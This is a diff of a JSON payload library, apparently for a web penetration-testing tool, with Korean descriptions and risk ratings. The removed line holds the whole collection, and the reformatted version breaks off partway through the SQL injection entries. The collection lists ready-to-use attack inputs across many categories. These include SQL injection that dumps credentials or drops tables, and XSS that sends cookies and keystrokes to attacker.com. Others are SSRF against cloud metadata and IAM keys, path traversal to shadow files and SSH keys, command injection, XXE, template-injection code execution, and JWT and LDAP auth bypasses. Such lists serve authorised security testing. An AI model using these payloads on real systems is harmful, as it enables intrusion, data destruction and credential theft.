@@ -1,1 +1,2430 @@
-{"categories":[{"id":"sqli","name":"SQL Injection","icon":"🗄️","color":"#e74c3c","payloads":[{"id":"sqli_01","name":"기본 인증 우회","payload":"' OR '1'='1","description":"WHERE 절 항상 참으로 우회","risk":"critical"},{"id":"sqli_02","name":"주석 기반 우회","payload":"' OR 1=1--","description":"나머지 쿼리 주석 처리","risk":"critical"},{"id":"sqli_03","name":"Admin 우회","payload":"admin'--","description":"admin 계정 패스워드 우회","risk":"critical"},{"id":"sqli_04","name":"NULL 비교 우회","payload":"' OR 'x'='x","description":"문자열 비교 우회","risk":"critical"},{"id":"sqli_05","name":"UNION 2컬럼","payload":"' UNION SELECT null,null--","description":"2컬럼 UNION 탐색","risk":"high"},{"id":"sqli_06","name":"UNION 3컬럼","payload":"' UNION SELECT null,null,null--","description":"3컬럼 UNION 탐색","risk":"high"},{"id":"sqli_07","name":"계정 추출","payload":"' UNION SELECT username,password FROM users--","description":"계정 정보 추출","risk":"critical"},{"id":"sqli_08","name":"DB 버전 MySQL","payload":"' UNION SELECT @@version,null--","description":"MySQL 버전 추출","risk":"high"},{"id":"sqli_09","name":"현재 DB명","payload":"' UNION SELECT database(),null--","description":"현재 데이터베이스명","risk":"high"},{"id":"sqli_10","name":"테이블 목록","payload":"' UNION SELECT table_name,null FROM information_schema.tables--","description":"전체 테이블 목록","risk":"critical"},{"id":"sqli_11","name":"컬럼 목록","payload":"' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--","description":"컬럼 목록 조회","risk":"critical"},{"id":"sqli_12","name":"에러 기반 MySQL","payload":"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","description":"에러 메시지 정보 추출","risk":"high"},{"id":"sqli_13","name":"에러 기반 MSSQL","payload":"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--","description":"MSSQL 형변환 에러","risk":"high"},{"id":"sqli_14","name":"Blind Boolean 참","payload":"' AND 1=1--","description":"Boolean Blind 참 조건","risk":"medium"},{"id":"sqli_15","name":"Blind Boolean 거짓","payload":"' AND 1=2--","description":"Boolean Blind 거짓 조건","risk":"medium"},{"id":"sqli_16","name":"Blind Time MySQL","payload":"' AND SLEEP(5)--","description":"MySQL 5초 시간 지연","risk":"medium"},{"id":"sqli_17","name":"Blind Time MSSQL","payload":"'; WAITFOR DELAY '0:0:5'--","description":"MSSQL 5초 지연","risk":"medium"},{"id":"sqli_18","name":"Blind Time PgSQL","payload":"'; SELECT pg_sleep(5)--","description":"PostgreSQL 5초 지연","risk":"medium"},{"id":"sqli_19","name":"Blind Time Oracle","payload":"' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--","description":"Oracle 5초 지연","risk":"medium"},{"id":"sqli_20","name":"파일 읽기 MySQL","payload":"' UNION SELECT LOAD_FILE('/etc/passwd'),null--","description":"MySQL 파일 읽기","risk":"critical"},{"id":"sqli_21","name":"xp_cmdshell MSSQL","payload":"'; EXEC xp_cmdshell('whoami')--","description":"MSSQL OS 명령 실행","risk":"critical"},{"id":"sqli_22","name":"대소문자 우회","payload":"' oR '1'='1","description":"대소문자 필터 우회","risk":"high"},{"id":"sqli_23","name":"주석 공백 우회","payload":"'/**/OR/**/1=1--","description":"주석으로 공백 필터 우회","risk":"high"},{"id":"sqli_24","name":"URL 인코딩 우회","payload":"%27%20OR%20%271%27%3D%271","description":"URL 인코딩 WAF 우회","risk":"high"},{"id":"sqli_25","name":"이중 URL 인코딩","payload":"%2527%2520OR%25201%253D1","description":"이중 인코딩 우회","risk":"high"},{"id":"sqli_26","name":"16진수 인코딩","payload":"' OR 0x313d31--","description":"16진수 인코딩 우회","risk":"high"},{"id":"sqli_27","name":"탭 공백 우회","payload":"'\tOR\t1=1--","description":"탭 문자 공백 우회","risk":"high"},{"id":"sqli_28","name":"DROP TABLE","payload":"'; DROP TABLE users--","description":"테이블 삭제 시도","risk":"critical"},{"id":"sqli_29","name":"Stacked Query","payload":"'; INSERT INTO users VALUES('hacker','hacked')--","description":"다중 쿼리 삽입","risk":"critical"},{"id":"sqli_30","name":"Boolean Blind (substr)","payload":"' AND SUBSTRING(username,1,1)='a'--","description":"문자 단위 데이터 추출","risk":"high"}]},{"id":"xss","name":"XSS (Cross-Site Scripting)","icon":"📜","color":"#f39c12","payloads":[{"id":"xss_01","name":"기본 Script","payload":"<script>alert('XSS')</script>","description":"기본 스크립트 태그","risk":"high"},{"id":"xss_02","name":"이미지 onerror","payload":"<img src=x onerror=alert('XSS')>","description":"이미지 onerror 이벤트","risk":"high"},{"id":"xss_03","name":"SVG onload","payload":"<svg onload=alert('XSS')>","description":"SVG 태그 onload","risk":"high"},{"id":"xss_04","name":"Body onload","payload":"<body onload=alert('XSS')>","description":"body 태그 onload","risk":"high"},{"id":"xss_05","name":"Input autofocus","payload":"<input autofocus onfocus=alert('XSS')>","description":"input autofocus 이벤트","risk":"high"},{"id":"xss_06","name":"Details ontoggle","payload":"<details open ontoggle=alert('XSS')>","description":"HTML5 details 태그","risk":"high"},{"id":"xss_07","name":"Video onerror","payload":"<video src=x onerror=alert('XSS')>","description":"video 태그 오류 이벤트","risk":"high"},{"id":"xss_08","name":"JavaScript URI","payload":"javascript:alert('XSS')","description":"javascript: 프로토콜","risk":"medium"},{"id":"xss_09","name":"대소문자 혼합","payload":"<ScRiPt>alert('XSS')</ScRiPt>","description":"태그 대소문자 우회","risk":"high"},{"id":"xss_10","name":"HTML 엔티티","payload":"&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;","description":"HTML 엔티티 인코딩","risk":"high"},{"id":"xss_11","name":"공백 없는 태그","payload":"<svg/onload=alert('XSS')>","description":"공백 없이 속성 연결","risk":"high"},{"id":"xss_12","name":"속성 탈출 쌍따옴표","payload":"\" onmouseover=\"alert('XSS')","description":"속성값 쌍따옴표 탈출","risk":"medium"},{"id":"xss_13","name":"속성 탈출 단따옴표","payload":"' onmouseover='alert(1)","description":"속성값 단따옴표 탈출","risk":"medium"},{"id":"xss_14","name":"쿠키 탈취","payload":"<script>document.location='http://attacker.com/?c='+document.cookie</script>","description":"쿠키 외부 전송","risk":"critical"},{"id":"xss_15","name":"Template literal","payload":"<script>alert`XSS`</script>","description":"괄호 없는 alert 호출","risk":"high"},{"id":"xss_16","name":"iframe srcdoc","payload":"<iframe srcdoc='<script>alert(1)</script>'>","description":"iframe srcdoc 속성","risk":"medium"},{"id":"xss_17","name":"DOM 기반 Fragment","payload":"#<script>alert('XSS')</script>","description":"URL fragment DOM XSS","risk":"medium"},{"id":"xss_18","name":"이중 URL 인코딩","payload":"%3Cscript%3Ealert('XSS')%3C/script%3E","description":"URL 이중 인코딩 우회","risk":"high"},{"id":"xss_19","name":"SVG animate","payload":"<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>","description":"SVG animate 이벤트","risk":"high"},{"id":"xss_20","name":"키로거","payload":"<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>","description":"키 입력 탈취","risk":"critical"},{"id":"xss_21","name":"Polyglot XSS","payload":"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/oNloAd=alert()//>>","description":"다중 컨텍스트 폴리글랏","risk":"high"},{"id":"xss_22","name":"CSP 우회 JSONP","payload":"<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert\"></script>","description":"JSONP CSP 우회","risk":"high"}]},{"id":"ssrf","name":"SSRF","icon":"🔀","color":"#9b59b6","payloads":[{"id":"ssrf_01","name":"localhost 127.0.0.1","payload":"http://127.0.0.1/","description":"내부 서비스 접근","risk":"high"},{"id":"ssrf_02","name":"localhost","payload":"http://localhost/","description":"localhost 접근","risk":"high"},{"id":"ssrf_03","name":"내부망 192.168.x.x","payload":"http://192.168.1.1/","description":"내부 라우터 접근","risk":"critical"},{"id":"ssrf_04","name":"내부망 10.x.x.x","payload":"http://10.0.0.1/","description":"사설 IP 범위","risk":"critical"},{"id":"ssrf_05","name":"AWS 메타데이터","payload":"http://169.254.169.254/latest/meta-data/","description":"AWS IMDSv1 메타데이터","risk":"critical"},{"id":"ssrf_06","name":"AWS IAM 자격증명","payload":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","description":"AWS IAM 키 탈취","risk":"critical"},{"id":"ssrf_07","name":"GCP 메타데이터","payload":"http://metadata.google.internal/computeMetadata/v1/","description":"GCP 메타데이터","risk":"critical"},{"id":"ssrf_08","name":"Azure 메타데이터","payload":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","description":"Azure IMDS 접근","risk":"critical"},{"id":"ssrf_09","name":"파일 프로토콜 Linux","payload":"file:///etc/passwd","description":"로컬 파일 읽기","risk":"critical"},{"id":"ssrf_10","name":"파일 프로토콜 Windows","payload":"file:///C:/Windows/win.ini","description":"Windows 파일 읽기","risk":"critical"},{"id":"ssrf_11","name":"Dict Redis","payload":"dict://127.0.0.1:6379/info","description":"Redis 정보 조회","risk":"high"},{"id":"ssrf_12","name":"IPv6 localhost","payload":"http://[::1]/","description":"IPv6 루프백","risk":"high"},{"id":"ssrf_13","name":"10진수 IP","payload":"http://2130706433/","description":"127.0.0.1 10진수","risk":"high"},{"id":"ssrf_14","name":"8진수 IP","payload":"http://0177.0.0.1/","description":"127.0.0.1 8진수","risk":"high"},{"id":"ssrf_15","name":"16진수 IP","payload":"http://0x7f000001/","description":"127.0.0.1 16진수","risk":"high"},{"id":"ssrf_16","name":"@ 기호 우회","payload":"http://attacker.com@127.0.0.1/","description":"@로 호스트 우회","risk":"high"},{"id":"ssrf_17","name":"Kubernetes API","payload":"http://10.96.0.1/api/v1/namespaces/default/secrets","description":"K8s API 서버","risk":"critical"},{"id":"ssrf_18","name":"Elasticsearch","payload":"http://127.0.0.1:9200/_cat/indices","description":"ES 인덱스 조회","risk":"high"},{"id":"ssrf_19","name":"내부 포트 8080","payload":"http://127.0.0.1:8080/","description":"내부 8080 포트 탐색","risk":"medium"},{"id":"ssrf_20","name":"내부 포트 3306","payload":"http://127.0.0.1:3306/","description":"MySQL 포트 탐색","risk":"medium"}]},{"id":"lfi","name":"LFI / Path Traversal","icon":"📁","color":"#27ae60","payloads":[{"id":"lfi_01","name":"Linux passwd","payload":"../../../etc/passwd","description":"Linux 계정 파일","risk":"high"},{"id":"lfi_02","name":"Linux shadow","payload":"../../../etc/shadow","description":"패스워드 해시","risk":"critical"},{"id":"lfi_03","name":"SSH 개인키","payload":"../../../root/.ssh/id_rsa","description":"root SSH 개인키","risk":"critical"},{"id":"lfi_04","name":"AWS 자격증명","payload":"../../../root/.aws/credentials","description":"AWS 자격증명","risk":"critical"},{"id":"lfi_05","name":"Apache 설정","payload":"../../../etc/apache2/apache2.conf","description":"Apache 설정 파일","risk":"medium"},{"id":"lfi_06","name":"Nginx 설정","payload":"../../../etc/nginx/nginx.conf","description":"Nginx 설정 파일","risk":"medium"},{"id":"lfi_07","name":"Windows hosts","payload":"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","description":"Windows hosts","risk":"medium"},{"id":"lfi_08","name":"Windows win.ini","payload":"..\\..\\..\\windows\\win.ini","description":"Windows 설정","risk":"medium"},{"id":"lfi_09","name":"IIS web.config","payload":"..\\..\\..\\inetpub\\wwwroot\\web.config","description":"IIS 웹 설정","risk":"high"},{"id":"lfi_10","name":"URL 인코딩","payload":"..%2F..%2F..%2Fetc%2Fpasswd","description":"URL 인코딩 우회","risk":"high"},{"id":"lfi_11","name":"이중 URL 인코딩","payload":"..%252F..%252F..%252Fetc%252Fpasswd","description":"이중 인코딩 우회","risk":"high"},{"id":"lfi_12","name":"Null 바이트","payload":"../../../etc/passwd%00","description":"Null 바이트 확장자 우회","risk":"medium"},{"id":"lfi_13","name":"중복 슬래시","payload":"....//....//....//etc/passwd","description":"이중 슬래시 우회","risk":"high"},{"id":"lfi_14","name":"PHP Filter Base64","payload":"php://filter/convert.base64-encode/resource=index.php","description":"PHP 소스 Base64","risk":"critical"},{"id":"lfi_15","name":"PHP Input","payload":"php://input","description":"PHP POST 입력 스트림","risk":"high"},{"id":"lfi_16","name":"Log Poisoning","payload":"../../../var/log/apache2/access.log","description":"Apache 로그 LFI-RCE","risk":"critical"},{"id":"lfi_17","name":"Proc environ","payload":"../../../proc/self/environ","description":"환경 변수 파일","risk":"high"},{"id":"lfi_18","name":"절대 경로","payload":"/etc/passwd","description":"절대 경로 직접 접근","risk":"high"}]},{"id":"cmdi","name":"Command Injection","icon":"💻","color":"#e67e22","payloads":[{"id":"cmdi_01","name":"세미콜론 분리","payload":"; id","description":"명령어 분리 실행","risk":"critical"},{"id":"cmdi_02","name":"파이프 연결","payload":"| whoami","description":"파이프 명령 실행","risk":"critical"},{"id":"cmdi_03","name":"AND 연산","payload":"&& cat /etc/passwd","description":"성공 시 명령 실행","risk":"critical"},{"id":"cmdi_04","name":"OR 연산","payload":"|| id","description":"실패 시 명령 실행","risk":"critical"},{"id":"cmdi_05","name":"백틱 치환","payload":"`id`","description":"백틱 명령 치환","risk":"critical"},{"id":"cmdi_06","name":"서브쉘 $()","payload":"$(whoami)","description":"$() 서브쉘 실행","risk":"critical"},{"id":"cmdi_07","name":"개행 분리","payload":"%0a id","description":"URL 개행 문자 분리","risk":"critical"},{"id":"cmdi_08","name":"CRLF 분리","payload":"%0d%0a id","description":"CRLF 명령 분리","risk":"critical"},{"id":"cmdi_09","name":"Blind sleep","payload":"; sleep 5","description":"Linux 5초 시간 지연","risk":"high"},{"id":"cmdi_10","name":"Blind ping Windows","payload":"& ping -n 5 127.0.0.1","description":"Windows 5회 ping 지연","risk":"high"},{"id":"cmdi_11","name":"OOB DNS","payload":"; nslookup attacker.com","description":"DNS OOB 탐지","risk":"high"},{"id":"cmdi_12","name":"공백 우회 $IFS","payload":";cat$IFS/etc/passwd","description":"$IFS 공백 필터 우회","risk":"critical"},{"id":"cmdi_13","name":"공백 우회 중괄호","payload":";{cat,/etc/passwd}","description":"중괄호 공백 우회","risk":"critical"},{"id":"cmdi_14","name":"Windows dir","payload":"& dir","description":"Windows 디렉토리 목록","risk":"high"},{"id":"cmdi_15","name":"Windows ipconfig","payload":"& ipconfig /all","description":"Windows 네트워크 정보","risk":"medium"},{"id":"cmdi_16","name":"인코딩 우회 base64","payload":";$(echo${IFS}d2hvYW1p|base64${IFS}-d|sh)","description":"Base64 인코딩 우회","risk":"critical"},{"id":"cmdi_17","name":"Windows CMD 캐럿","payload":"c^m^d /c whoami","description":"캐럿으로 필터 우회","risk":"high"}]},{"id":"xxe","name":"XXE Injection","icon":"📄","color":"#16a085","payloads":[{"id":"xxe_01","name":"기본 파일 읽기","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>","description":"로컬 파일 읽기","risk":"critical"},{"id":"xxe_02","name":"Windows 파일","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><root>&xxe;</root>","description":"Windows 파일 읽기","risk":"critical"},{"id":"xxe_03","name":"SSRF via XXE","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>","description":"XXE를 통한 SSRF","risk":"critical"},{"id":"xxe_04","name":"Blind XXE DNS","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/xxetest\">]><root>&xxe;</root>","description":"Blind XXE DNS 탐지","risk":"high"},{"id":"xxe_05","name":"OOB 외부 DTD","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://attacker.com/xxe.dtd\"> %ext;]><root/>","description":"외부 DTD 로드 OOB","risk":"critical"},{"id":"xxe_06","name":"XInclude 우회","payload":"<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>","description":"XInclude XXE 우회","risk":"high"}]},{"id":"ssti","name":"SSTI (템플릿 인젝션)","icon":"🔧","color":"#8e44ad","payloads":[{"id":"ssti_01","name":"탐지 수식","payload":"{{7*7}}","description":"템플릿 실행 탐지 (49 반환)","risk":"medium"},{"id":"ssti_02","name":"탐지 문자열 곱","payload":"{{7*'7'}}","description":"Twig:49 / Jinja2:7777777","risk":"medium"},{"id":"ssti_03","name":"Jinja2 config","payload":"{{config}}","description":"Flask/Jinja2 설정 객체","risk":"high"},{"id":"ssti_04","name":"Jinja2 environ","payload":"{{request.environ}}","description":"환경 변수 전체 노출","risk":"high"},{"id":"ssti_05","name":"Jinja2 RCE","payload":"{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}","description":"Jinja2 Python 클래스 RCE","risk":"critical"},{"id":"ssti_06","name":"Twig RCE PHP","payload":"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}","description":"Twig PHP RCE","risk":"critical"},{"id":"ssti_07","name":"FreeMarker Java","payload":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}","description":"FreeMarker Java RCE","risk":"critical"},{"id":"ssti_08","name":"ERB Ruby","payload":"<%= `id` %>","description":"ERB Ruby RCE","risk":"critical"},{"id":"ssti_09","name":"Mako Python","payload":"${__import__('os').popen('id').read()}","description":"Mako Python RCE","risk":"critical"}]},{"id":"nosql","name":"NoSQL Injection","icon":"🍃","color":"#27ae60","payloads":[{"id":"nosql_01","name":"MongoDB $ne 우회","payload":"{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}","description":"not-equal 인증 우회","risk":"critical"},{"id":"nosql_02","name":"MongoDB $gt 우회","payload":"{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}","description":"greater-than 인증 우회","risk":"critical"},{"id":"nosql_03","name":"MongoDB $regex","payload":"{\"username\":{\"$regex\":\"admin\"},\"password\":{\"$regex\":\".*\"}}","description":"정규식 인증 우회","risk":"critical"},{"id":"nosql_04","name":"MongoDB $where","payload":"{\"$where\":\"function(){return true}\"}","description":"MongoDB JS 인젝션","risk":"critical"},{"id":"nosql_05","name":"URL $ne GET","payload":"username[$ne]=invalid&password[$ne]=invalid","description":"GET 파라미터 우회","risk":"critical"},{"id":"nosql_06","name":"URL $gt GET","payload":"username[$gt]=&password[$gt]=","description":"GET $gt 우회","risk":"critical"},{"id":"nosql_07","name":"CouchDB DB 목록","payload":"/_all_dbs","description":"CouchDB DB 목록","risk":"high"},{"id":"nosql_08","name":"MongoDB JS 인젝션","payload":"';return 'a'=='a' && ''=='","description":"JS 표현식 인젝션","risk":"high"}]},{"id":"redirect","name":"Open Redirect","icon":"↪️","color":"#f1c40f","payloads":[{"id":"redir_01","name":"외부 URL","payload":"https://evil.com","description":"외부 URL 리다이렉트","risk":"medium"},{"id":"redir_02","name":"프로토콜 상대경로","payload":"//evil.com","description":"프로토콜 없는 리다이렉트","risk":"medium"},{"id":"redir_03","name":"URL 인코딩","payload":"https%3A%2F%2Fevil.com","description":"URL 인코딩 우회","risk":"medium"},{"id":"redir_04","name":"삼중 슬래시","payload":"///evil.com","description":"슬래시 3개 우회","risk":"medium"},{"id":"redir_05","name":"@ 기호 위장","payload":"https://trusted.com@evil.com","description":"@로 호스트 위장","risk":"medium"},{"id":"redir_06","name":"CRLF 헤더 인젝션","payload":"/redirect?url=https://trusted.com%0d%0aSet-Cookie:session=evil","description":"CRLF 헤더 인젝션","risk":"high"},{"id":"redir_07","name":"도메인 접미사 우회","payload":"https://trusted.com.evil.com","description":"화이트리스트 우회","risk":"medium"},{"id":"redir_08","name":"이중 인코딩","payload":"https%253A%252F%252Fevil.com","description":"이중 URL 인코딩","risk":"medium"}]},{"id":"jwt","name":"JWT 공격","icon":"🔑","color":"#e67e22","payloads":[{"id":"jwt_01","name":"Algorithm None","payload":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.","description":"alg:none 서명 검증 우회","risk":"critical"},{"id":"jwt_02","name":"Algorithm None 변형","payload":"eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.","description":"대소문자 None 우회","risk":"critical"},{"id":"jwt_03","name":"RS256 HS256 혼용","payload":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE","description":"공개키 HMAC 서명 우회","risk":"critical"},{"id":"jwt_04","name":"kid 경로 탐색","payload":"{\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}","description":"kid 파라미터 경로 탐색","risk":"critical"},{"id":"jwt_05","name":"jku 헤더 인젝션","payload":"{\"alg\":\"RS256\",\"jku\":\"https://attacker.com/jwks.json\"}","description":"외부 JWKS URL 인젝션","risk":"critical"},{"id":"jwt_06","name":"만료시간 조작","payload":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.SIG","description":"exp 클레임 조작","risk":"high"}]},{"id":"header","name":"Header Injection","icon":"📋","color":"#1abc9c","payloads":[{"id":"hdr_01","name":"Host 헤더 조작","payload":"evil.com","description":"Host 헤더 인젝션","risk":"medium","header":"Host"},{"id":"hdr_02","name":"X-Forwarded-For IP 우회","payload":"127.0.0.1","description":"IP 접근 제어 우회","risk":"medium","header":"X-Forwarded-For"},{"id":"hdr_03","name":"X-Real-IP 우회","payload":"127.0.0.1","description":"실제 IP 숨기기","risk":"medium","header":"X-Real-IP"},{"id":"hdr_04","name":"X-Originating-IP","payload":"127.0.0.1","description":"IP 우회 시도","risk":"medium","header":"X-Originating-IP"},{"id":"hdr_05","name":"User-Agent SQLi","payload":"' OR 1=1--","description":"UA 헤더 SQLi","risk":"medium","header":"User-Agent"},{"id":"hdr_06","name":"Referer 우회","payload":"https://trusted.internal.com/admin","description":"리퍼러 접근 제어 우회","risk":"low","header":"Referer"},{"id":"hdr_07","name":"X-HTTP-Method-Override","payload":"DELETE","description":"HTTP 메서드 오버라이드","risk":"medium","header":"X-HTTP-Method-Override"},{"id":"hdr_08","name":"Content-Type 변경","payload":"application/x-www-form-urlencoded","description":"파서 우회 시도","risk":"medium","header":"Content-Type"},{"id":"hdr_09","name":"Origin CORS 우회","payload":"https://trusted.com","description":"CORS 정책 우회","risk":"medium","header":"Origin"},{"id":"hdr_10","name":"CRLF 헤더 분리","payload":"value\r\nSet-Cookie: admin=1","description":"CRLF 인젝션","risk":"high","header":"Custom-Header"},{"id":"hdr_11","name":"X-Custom-IP-Authorization","payload":"127.0.0.1","description":"커스텀 IP 인가 우회","risk":"medium","header":"X-Custom-IP-Authorization"},{"id":"hdr_12","name":"X-Remote-Addr","payload":"127.0.0.1","description":"원격 주소 위조","risk":"medium","header":"X-Remote-Addr"}]},{"id":"prototype","name":"Prototype Pollution","icon":"🧬","color":"#c0392b","payloads":[{"id":"proto_01","name":"__proto__ 오염","payload":"{\"__proto__\":{\"admin\":true}}","description":"Object prototype 오염","risk":"high"},{"id":"proto_02","name":"constructor 오염","payload":"{\"constructor\":{\"prototype\":{\"admin\":true}}}","description":"constructor.prototype 오염","risk":"high"},{"id":"proto_03","name":"URL 파라미터 오염","payload":"__proto__[admin]=true","description":"쿼리스트링 오염","risk":"high"},{"id":"proto_04","name":"NODE_OPTIONS RCE","payload":"{\"__proto__\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}","description":"NODE_OPTIONS RCE","risk":"critical"},{"id":"proto_05","name":"XSS via innerHTML","payload":"{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}","description":"innerHTML 오염 XSS","risk":"high"},{"id":"proto_06","name":"중첩 오염","payload":"{\"a\":{\"__proto__\":{\"admin\":true}}}","description":"중첩 객체 오염","risk":"high"}]},{"id":"ldap","name":"LDAP Injection","icon":"🗂","color":"#2980b9","payloads":[{"id":"ldap_01","name":"기본 인증 우회","payload":"*)(&","description":"LDAP 필터 인증 우회","risk":"critical"},{"id":"ldap_02","name":"와일드카드 우회","payload":"*)(uid=*))(|(uid=*","description":"와일드카드 인증 우회","risk":"critical"},{"id":"ldap_03","name":"Null 우회","payload":"\\00","description":"Null 바이트 인젝션","risk":"high"},{"id":"ldap_04","name":"전체 오브젝트 탐색","payload":"*(|(objectClass=*))","description":"전체 LDAP 오브젝트","risk":"high"},{"id":"ldap_05","name":"이메일 탐색","payload":"*(|(mail=*))","description":"이메일 속성 탐색","risk":"medium"},{"id":"ldap_06","name":"Blind LDAP","payload":"admin)(|(password=a*","description":"Blind LDAP 패스워드","risk":"high"}]},{"id":"business","name":"비즈니스 로직 / IDOR","icon":"🏢","color":"#95a5a6","payloads":[{"id":"biz_01","name":"IDOR ID 변경","payload":"id=1","description":"다른 사용자 ID 변경","risk":"high"},{"id":"biz_02","name":"IDOR 음수 ID","payload":"id=-1","description":"음수 ID 접근","risk":"medium"},{"id":"biz_03","name":"IDOR UUID","payload":"id=00000000-0000-0000-0000-000000000001","description":"순차 UUID 추측","risk":"medium"},{"id":"biz_04","name":"가격 0원","payload":"price=0","description":"가격 파라미터 0원","risk":"high"},{"id":"biz_05","name":"가격 음수","payload":"price=-100","description":"음수 가격 환불 유발","risk":"high"},{"id":"biz_06","name":"수량 음수","payload":"quantity=-1","description":"음수 수량 오버플로우","risk":"high"},{"id":"biz_07","name":"Role admin","payload":"role=admin","description":"권한 직접 변경","risk":"critical"},{"id":"biz_08","name":"Status 조작","payload":"status=approved","description":"결재 상태 변경","risk":"high"},{"id":"biz_09","name":"Step Bypass","payload":"step=3","description":"다단계 단계 건너뜀","risk":"high"},{"id":"biz_10","name":"계정 연결 탈취","payload":"account_id=victim@example.com","description":"타인 계정 연결","risk":"critical"}]}]}
+{
+  "categories": [
+    {
+      "id": "sqli",
+      "name": "SQL Injection",
+      "icon": "🗄️",
+      "color": "#e74c3c",
+      "payloads": [
+        {
+          "id": "sqli_01",
+          "name": "기본 인증 우회",
+          "payload": "' OR '1'='1",
+          "description": "WHERE 절 항상 참으로 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_02",
+          "name": "주석 기반 우회",
+          "payload": "' OR 1=1--",
+          "description": "나머지 쿼리 주석 처리",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_03",
+          "name": "Admin 우회",
+          "payload": "admin'--",
+          "description": "admin 계정 패스워드 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_04",
+          "name": "NULL 비교 우회",
+          "payload": "' OR 'x'='x",
+          "description": "문자열 비교 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_05",
+          "name": "UNION 2컬럼",
+          "payload": "' UNION SELECT null,null--",
+          "description": "2컬럼 UNION 탐색",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_06",
+          "name": "UNION 3컬럼",
+          "payload": "' UNION SELECT null,null,null--",
+          "description": "3컬럼 UNION 탐색",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_07",
+          "name": "계정 추출",
+          "payload": "' UNION SELECT username,password FROM users--",
+          "description": "계정 정보 추출",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_08",
+          "name": "DB 버전 MySQL",
+          "payload": "' UNION SELECT @@version,null--",
+          "description": "MySQL 버전 추출",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_09",
+          "name": "현재 DB명",
+          "payload": "' UNION SELECT database(),null--",
+          "description": "현재 데이터베이스명",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_10",
+          "name": "테이블 목록",
+          "payload": "' UNION SELECT table_name,null FROM information_schema.tables--",
+          "description": "전체 테이블 목록",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_11",
+          "name": "컬럼 목록",
+          "payload": "' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--",
+          "description": "컬럼 목록 조회",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_12",
+          "name": "에러 기반 MySQL",
+          "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+          "description": "에러 메시지 정보 추출",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_13",
+          "name": "에러 기반 MSSQL",
+          "payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+          "description": "MSSQL 형변환 에러",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_14",
+          "name": "Blind Boolean 참",
+          "payload": "' AND 1=1--",
+          "description": "Boolean Blind 참 조건",
+          "risk": "medium"
+        },
+        {
+          "id": "sqli_15",
+          "name": "Blind Boolean 거짓",
+          "payload": "' AND 1=2--",
+          "description": "Boolean Blind 거짓 조건",
+          "risk": "medium"
+        },
+        {
+          "id": "sqli_16",
+          "name": "Blind Time MySQL",
+          "payload": "' AND SLEEP(5)--",
+          "description": "MySQL 5초 시간 지연",
+          "risk": "medium"
+        },
+        {
+          "id": "sqli_17",
+          "name": "Blind Time MSSQL",
+          "payload": "'; WAITFOR DELAY '0:0:5'--",
+          "description": "MSSQL 5초 지연",
+          "risk": "medium"
+        },
+        {
+          "id": "sqli_18",
+          "name": "Blind Time PgSQL",
+          "payload": "'; SELECT pg_sleep(5)--",
+          "description": "PostgreSQL 5초 지연",
+          "risk": "medium"
+        },
+        {
+          "id": "sqli_19",
+          "name": "Blind Time Oracle",
+          "payload": "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
